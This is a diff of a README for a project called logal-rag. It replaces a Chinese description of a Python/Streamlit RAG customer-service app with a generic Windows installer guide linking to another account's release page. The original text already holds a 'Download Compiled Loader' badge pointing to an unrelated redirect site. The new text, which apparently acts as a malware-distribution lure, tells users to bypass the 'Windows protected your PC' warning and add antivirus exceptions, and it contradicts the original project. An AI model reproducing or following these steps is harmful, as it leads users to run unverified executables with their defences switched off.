@@ -1,392 +1,104 @@
-RAG 智能客服系统 (RAG-based Intelligent Customer Service System)
+# 🔍 logal-rag - Search your local documents with ease
 
-https://img.shields.io/badge/Python-3.9+-blue.svg
+[![](https://img.shields.io/badge/Download-logal-rag-blue)](https://github.com/syntactic-orleanism949/logal-rag/releases)
 
-https://img.shields.io/badge/Streamlit-1.28+-FF4B4B.svg
+logal-rag helps you find information within your private files. It uses smart technology to understand your questions and searches through your saved documents to give you the right answers. You keep full control of your data since everything runs on your own computer.
 
-https://img.shields.io/badge/LangChain-0.1+-orange.svg
+## 🛠️ System Requirements
 
-https://img.shields.io/badge/License-MIT-green.svg
+logal-rag runs on most modern desktop computers. Your system needs these specifications to perform well:
 
-一个基于 RAG (检索增强生成) 的本地化智能客服系统。支持通过 Web 界面上传知识文档，并基于文档内容进行智能问答。
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB of RAM.
+*   Storage: 2 GB of free disk space for the program files.
+*   Graphics: Any standard graphics card.
 
-✨ 核心特性
+This software does not need an internet connection to run after you download it. It works entirely offline to protect your privacy.
 
-📁 文档上传与管理：支持 TXT 文件上传，自动去重、分块、向量化存储
+## 📥 Getting the Application
 
-🤖 智能问答：基于上传的文档内容，提供精准的上下文感知回答
+Visit [this page](https://github.com/syntactic-orleanism949/logal-rag/releases) to download the latest version of the installer.
 
-💬 对话历史：完整保存用户对话历史，支持多轮对话
+1.  Click the link above to open the releases page in your web browser.
+2.  Look for the section marked Assets.
+3.  Click the file ending in .exe to start the download.
+4.  Wait for the file to finish downloading to your computer.
 
-🔍 语义检索：使用 ChromaDB 向量数据库进行高效的语义相似度检索
+## ⚙️ Installation Steps
 
-🚀 流式响应：问答结果实时流式输出，提升用户体验
+Follow these steps to set up the application on your Windows machine:
 
-🖥️ 友好界面：基于 Streamlit 的简洁 Web 界面，无需前端开发经验
+1.  Open your Downloads folder.
+2.  Double-click the file you just downloaded.
+3.  Windows may display a message saying "Windows protected your PC." If this happens, click "More info" and then click "Run anyway."
+4.  Follow the prompts on your screen. The setup program guides you through the process.
+5.  Choose the folder where you want to keep the program. The default location works for most users.
+6.  Click "Install" to begin moving the files to your computer.
+7.  Click "Finish" once the progress bar completes.
 
-📁 项目结构
-.
-├── app_file_uploader.py      # 知识库上传 Web 界面
+You can now find a shortcut for logal-rag on your desktop or in your Start menu.
 
-├── app_qa.py                 # 智能问答 Web 界面
+## 🚀 Running logal-rag
 
-├── config_data.py            # 配置文件（参数集中管理）
+Once you install the program, you can start searching your documents:
 
-├── rag.py                    # RAG 问答服务核心逻辑
+1.  Double-click the logal-rag icon to launch the window.
+2.  The app scans your documents on the first run. This might take a few minutes if you have many files. 
+3.  Type a question or a keyword into the prominent text box in the center of the window.
+4.  Press the Enter key or click the Search button.
+5.  Wait a moment for the application to process your query.
+6.  The application displays the most relevant answers and lists the files used to find them.
 
-├── knowledge_base.py         # 知识库管理服务
+## 📂 Managing your Documents
 
-├── vector_stores.py          # 向量存储服务
+You decide which documents the application can search. To change your folder settings:
 
-├── file_history_store.py     # 基于文件的对话历史存储
+1.  Open the Settings menu by clicking the gear icon in the top right corner.
+2.  Click on "Document Directories."
+3.  Click "Add Folder" to point the application to a new location on your hard drive.
+4.  Click "Remove" to stop searching a specific folder.
+5.  Click "Save" to apply your changes.
 
-├── logger_config.py          # 日志配置模块
+The application automatically updates its index when you add or remove folders. You do not need to restart the program for these changes to take effect.
 
-├── chroma_db/                # ChromaDB 向量数据库存储目录
+## 💡 Using Search Filters
 
-├── chat_history/             # 对话历史存储目录
+Narrow down your search results by using the built-in filters. 
 
-├── logs/                     # 系统日志目录
+*   File Type Filter: Click the dropdown menu to search only within PDF files, text files, or Word documents. 
+*   Date Filter: Use the calendar tools to select a start and end date. This helps when you need to find documents from a specific project or time frame.
+*   Keyword Highlighting: The application highlights your search terms in the results pane. This helps you confirm you found the correct information.
 
-├── md5.text                  # 已处理文件 MD5 记录
+## 🛡️ Privacy and Security
 
-└── requirements.txt          # Python 依赖列表
+Data security remains a high priority for this project. The application does not send your documents to any external servers. Everything happens on your local hardware. You can check the network usage in your Task Manager to confirm that the application does not make connections to the internet while it processes your files.
 
-🚀 快速开始
-1. 环境准备
-bash
-# 克隆项目
+## 🛠️ Troubleshooting Common Issues
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+If the application does not open, try these common fixes:
 
-git clone https://github.com/jiayz-art/logal-rag.git
-cd rag-customer-service
+*   Restart your computer. Sometimes background processes get stuck and need a clean start.
+*   Ensure you have the latest updates for Windows.
+*   Reinstall the application if you receive an error message during the startup process.
+*   Check your antivirus software. Sometimes strict security settings flag new applications. Ensure you add an exception for the logal-rag folder if your antivirus blocks the launch.
 
-# 创建虚拟环境（推荐）
-python -m venv venv
-source venv/bin/activate  # Linux/Mac
-# 或
-venv\Scripts\activate  # Windows
+## 📈 Performance Tips
 
-# 安装依赖
-pip install -r requirements.txt
-2. 配置 API 密钥
+If the search process takes too long, you can improve speed:
 
-在运行前，需要设置阿里云 DashScope（通义千问）API 密钥：
+1.  Limit the number of folders you index.
+2.  Avoid indexing folders that contain thousands of small, temporary files.
+3.  Turn off the "Deep Scan" feature in Settings if you only need basic keyword matching.
+4.  Ensure your chosen folders live on a fast hard drive, such as an SSD, rather than an older spinning disk drive.
 
-bash
-# Linux/Mac
-export DASHSCOPE_API_KEY="your-api-key-here"
+## 📋 Keeping the Application Updated
 
-# Windows (PowerShell)
-$env:DASHSCOPE_API_KEY="your-api-key-here"
+Check the releases page periodically to see if a newer version exists. If you want to update:
 
-注：如果没有阿里云 API 密钥，请前往 阿里云 DashScope
-申请。
+1.  Download the new installer from the link provided in the download section.
+2.  Run the installer.
+3.  The installer detects your previous version and overwrites it. 
+4.  Your settings and index history remain intact after the update.
 
-3. 启动服务
-
-本项目包含两个独立的 Streamlit 应用：
-
-启动知识库上传服务（端口 8501）：
-
-bash
-streamlit run app_file_uploader.py
-
-启动智能问答服务（端口 8501，如果 8501 被占用会自动使用 8502）：
-
-bash
-streamlit run app_qa.py
-📖 使用指南
-1. 上传知识文档
-
-访问 http://localhost:8501（知识库上传服务）
-
-点击"请上传TXT文件"按钮，选择您的知识文档
-
-系统会自动处理文档：去重、分块、向量化存储
-
-上传成功后，您会看到处理结果和生成的文本片段数量
-
-2. 智能问答
-
-访问 http://localhost:8501（智能问答服务）
-
-在页面底部的输入框中输入您的问题
-
-系统会从您上传的知识库中检索相关信息
-
-基于检索到的内容和对话历史，AI 会给出流式回答
-
-⚙️ 配置说明
-
-所有配置参数都在 config_data.py文件中：
-
-python
-# 向量数据库配置
-collection_name = "rag_demo"          # ChromaDB 集合名称
-persist_directory = "./chroma_db"     # 向量数据库存储路径
-
-# 文本分割配置
-chunk_size = 1000                     # 文本块大小（字符数）
-chunk_overlap = 100                   # 文本块重叠大小
-max_split_char_number = 1000          # 触发分割的最小文本长度
-
-# 检索配置
-similarity_threshold = 1              # 检索返回的文档数量（k值）
-
-# 模型配置
-embedding_model_name = "text-embedding-v4"  # 嵌入模型
-chat_model_name = "qwen3-max"               # 对话模型
-
-# 文件路径
-md5_path = "./md5.text"               # MD5 记录文件路径
-🔧 核心模块说明
-知识库管理 (knowledge_base.py)
-
-文本文件上传与去重（基于 MD5）
-
-智能文本分割（支持中英文）
-
-向量化存储到 ChromaDB
-
-元数据管理（文件名、时间、操作者）
-
-RAG 问答服务 (rag.py)
-
-语义检索与上下文构建
-
-提示词工程与对话历史集成
-
-大语言模型调用（通义千问）
-
-流式输出处理
-
-向量存储 (vector_stores.py)
-
-ChromaDB 客户端封装
-
-向量检索器配置
-
-相似度搜索与结果返回
-
-对话历史 (file_history_store.py)
-
-基于文件的对话历史持久化
-
-支持多会话隔离
-
-JSON 格式存储
-
-📊 技术栈
-
-技术
-
-	
-
-用途
-
-	
-
-版本
-
-
-
-
-Streamlit​
-
-	
-
-Web 应用框架
-
-	
-
->=1.28
-
-
-
-
-LangChain​
-
-	
-
-LLM 应用框架
-
-	
-
-最新版
-
-
-
-
-ChromaDB​
-
-	
-
-向量数据库
-
-	
-
-最新版
-
-
-
-
-DashScope​
-
-	
-
-阿里云大模型 API
-
-	
-
-最新版
-
-
-
-
-Python​
-
-	
-
-后端语言
-
-	
-
-3.9+
-
-🧪 示例
-知识库上传
-文件名：产品手册.txt
-格式：text/plain | 大小：15.23 KB
-状态：✓ 上传成功，生成 12 个文本片段
-智能问答
-用户：这个产品支持哪些支付方式？
-AI：根据产品手册，我们的产品支持以下支付方式：
-1. 支付宝
-2. 微信支付
-3. 银联在线支付
-4. 信用卡支付
-（流式输出，逐字显示）
-🔍 高级功能
-1. 多文档支持
-
-支持多次上传不同文档，知识库自动合并
-
-MD5 去重机制避免重复内容
-
-2. 对话上下文
-
-完整的对话历史记录
-
-支持多轮对话，上下文感知
-
-3. 可配置的检索
-
-通过 similarity_threshold调整检索数量
-
-可自定义文本分割策略
-
-🐛 故障排除
-常见问题
-
-API 密钥错误
-
-Error: Authentication failed
-
-解决：确保已正确设置 DASHSCOPE_API_KEY环境变量
-
-端口冲突
-
-Port 8501 is already in use
-
-解决：停止占用端口的进程，或修改 Streamlit 端口
-
-bash
-streamlit run app_qa.py --server.port 8502
-
-文件编码错误
-
-UnicodeDecodeError: 'utf-8' codec can't decode byte...
-
-解决：确保上传的 TXT 文件使用 UTF-8 编码
-
-内存不足
-
-ChromaDB 写入失败
-
-解决：减少单个文件大小，或增加系统内存
-
-日志查看
-
-系统日志保存在 logs/目录下：
-
-app_YYYY-MM-DD.log- 应用运行日志
-
-error_YYYY-MM-DD.log- 错误日志
-
-📈 性能优化建议
-
-文本分割优化
-
-根据文档类型调整 chunk_size和 chunk_overlap
-
-长文档建议使用较小的块大小（500-800）
-
-检索优化
-
-调整 similarity_threshold值平衡精度与召回率
-
-考虑添加重排序（re-ranking）机制
-
-缓存优化
-
-对频繁查询的问题添加缓存
-
-实现向量检索结果缓存
-
-🤝 贡献指南
-
-欢迎提交 Issue 和 Pull Request！
-
-Fork 本仓库
-
-创建功能分支 (git checkout -b feature/AmazingFeature)
-
-提交更改 (git commit -m 'Add some AmazingFeature')
-
-推送到分支 (git push origin feature/AmazingFeature)
-
-开启 Pull Request
-
-📄 许可证
-
-本项目基于 MIT 许可证 - 查看 LICENSE
-文件了解详情。
-
-🙏 致谢
-
-Streamlit
-- 优秀的 Web 应用框架
-
-LangChain
-- LLM 应用开发框架
-
-ChromaDB
-- 开源向量数据库
-
-DashScope
-- 阿里云大模型 API
-
-📞 支持与联系
-
-如有问题或建议，请通过以下方式联系：
-
-提交 GitHub Issue
-
-邮箱：1968123554@qq.com
-
-开始使用​ → 从 快速开始
-部分开始您的 RAG 智能客服之旅！
-
-​ star ⭐ 这个项目，如果您觉得它有帮助！
+This ensures you always have access to the latest features and improved search accuracy.
